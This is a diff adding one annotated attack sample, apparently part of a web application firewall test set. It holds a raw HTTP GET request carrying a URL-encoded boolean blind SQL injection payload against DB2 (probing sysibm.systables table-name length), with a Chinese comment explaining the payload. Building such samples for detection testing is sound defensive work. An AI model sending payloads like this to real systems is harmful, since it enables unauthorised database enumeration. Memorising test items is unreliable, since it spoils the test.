@@ -1,0 +1,9 @@
+# SQL注入_GET_db2_布尔注入-06506484
+# 基于布尔注入，该SQL注入语句中："1 and 3<(select length(name) from sysibm.systables fetch first 1 rows only)"，攻击目的是确定第一个表的名称长度是否大于3。攻击者的目的可能是了解第一个表的名称长度以及表名的构成，这可能有助于进行其他类型的攻击，例如布尔盲注入或其他注入攻击。
+GET /?id=1%20and%203%3C%28select%20length%28name%29%20from%20sysibm.systables%20%20fetch%20first%201%20rows%20only%29&bid=hd_tag_m8mv26ks HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26ks
+RM-PRO-Token: 777584768f30a40b2d97781a99e97b81
+RM-PRO-Time: 1742808627709
+User-Agent: curl/7.83.1
+
